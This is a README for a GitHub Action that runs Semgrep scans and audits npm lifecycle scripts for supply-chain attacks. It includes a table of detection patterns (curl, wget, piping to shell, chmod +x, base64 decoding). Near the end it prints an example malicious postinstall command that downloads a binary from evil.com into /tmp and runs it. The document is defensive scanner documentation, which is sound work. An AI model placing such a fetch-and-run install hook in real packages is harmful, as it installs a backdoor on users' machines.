# SEC Checks - SAST & Supply Chain Scanner

A composite GitHub Action that runs [Semgrep](https://semgrep.dev) SAST scanning and audits `package.json` lifecycle scripts for supply chain attacks.

## Features

- 🔍 **Semgrep SAST** — 1000+ community rules across 30+ languages
- 🔐 **Supply chain audit** — detects malicious `postinstall`/`preinstall` scripts (curl, wget, chmod, /tmp, eval, base64, etc.)
- 📊 **Job Summary** — rich markdown table of findings in the Actions UI
- ⚙️ **Configurable** — custom severity threshold, custom rules, optional supply chain audit
- 📦 **Artifact upload** — JSON results saved on every run

## Usage

```yaml
- uses: actions/checkout@v6

- name: Run SAST Scanner
  uses: rusowyler/sec-checks@v1
```

### With options

```yaml
- name: Run SAST Scanner
  uses: rusowyler/sec-checks@v1
  with:
    semgrep-config: "p/owasp-top-ten"
    custom-rules-path: ".semgrep/"
    fail-on-severity: "ERROR"
    supply-chain-audit: "true"
    artifact-name: "sast-results"
    trusted-actions: "actions/checkout, actions/setup-node, docker/login-action"
```

> **`trusted-actions`** — By default the action warns on any `uses: owner/action@vX` reference because mutable tags are a supply chain risk (see [tj-actions/changed-files, March 2025](https://www.infoq.com/news/2025/04/compromised-github-action/)). Add well-maintained, frequently-audited actions here to suppress those warnings while still catching less established ones.
>
> **Reusable workflow calls** (e.g. `uses: Lendistrydev/sot/.github/workflows/deployer-dev.yaml@main`) are also matched. Pass either:
> - The `owner/repo` prefix to trust the entire repository: `Lendistrydev/sot`
> - The full workflow path to trust only that specific file: `Lendistrydev/sot/.github/workflows/deployer-dev.yaml`
>
> Example trusting both standard actions and a reusable workflow repo:
> ```yaml
> trusted-actions: "actions/checkout, actions/setup-node, Lendistrydev/sot"
> ```

## Inputs

| Input | Description | Default |
|-------|-------------|---------|
| `semgrep-config` | Semgrep ruleset (`auto`, `p/owasp-top-ten`, local path, etc.) | `auto` |
| `custom-rules-path` | Path to your custom Semgrep rules directory | `.semgrep/` |
| `fail-on-severity` | Minimum severity to fail the build (`ERROR`, `WARNING`, `INFO`) | `ERROR` |
| `supply-chain-audit` | Enable `package.json` lifecycle script audit | `true` |
| `artifact-name` | Name of the uploaded results artifact | `semgrep-results` |
| `trusted-actions` | Comma-separated GitHub Actions allowed to use version tags instead of commit SHAs (e.g. `actions/checkout, docker/login-action`) | `""` |

## Outputs

| Output | Description |
|--------|-------------|
| `findings-count` | Total number of Semgrep findings |
| `blocking-count` | Findings at or above `fail-on-severity` |
| `supply-chain-findings` | Number of suspicious lifecycle scripts found |

## Suppressing findings for specific paths

If certain directories contain intentional or dev-only code that triggers false positives (e.g. Dockerfiles without a `USER` instruction used only for local development), you can exclude them from Semgrep scanning by creating a `.semgrepignore` file in the root of your repository.

`.semgrepignore` uses the same syntax as `.gitignore`:

```
# Ignore dev Docker images
docker/

# Ignore test fixtures
tests/fixtures/
```

Semgrep reads this file automatically — no action input change required. Excluded paths are skipped entirely, so no findings will be reported for them.

### Inline suppression

To suppress a single finding without changing `trusted-actions` or ignoring an entire path, add `# nosemgrep: github-actions-unpinned-action` to the end of the `uses:` line in your workflow file:

```yaml
uses: repo-owner/repo-name/.github/workflows/deployer.yaml@main  # nosemgrep: github-actions-unpinned-action
```

Use this for one-off exemptions; prefer `trusted-actions` when you want to trust all workflows from an internal repo.

## Detected supply chain patterns

The audit step flags any `preinstall`, `postinstall`, `prepare`, `prepack`, or `postpack` script containing:

| Pattern | Reason |
|---------|--------|
| `curl https://...` | Downloading remote content |
| `wget https://...` | Downloading remote content |
| `\| sh` / `\| bash` | Piping to shell |
| `chmod +x` | Making a file executable |
| `/tmp/` | Writing to temp directory |
| `eval(` | Dynamic code execution |
| `base64 -d` | Possible obfuscation |
| `python3 -c` | Inline Python execution |
| `node -e` | Inline Node execution |
| `exec(` | Process execution |

### Example caught attack

```json
"postinstall": "curl -skL https://evil.com/backdoor -o /tmp/.sshd && chmod +x /tmp/.sshd && /tmp/.sshd &"
```

This fires on 3 patterns: `curl`, `chmod +x`, and `/tmp/`.
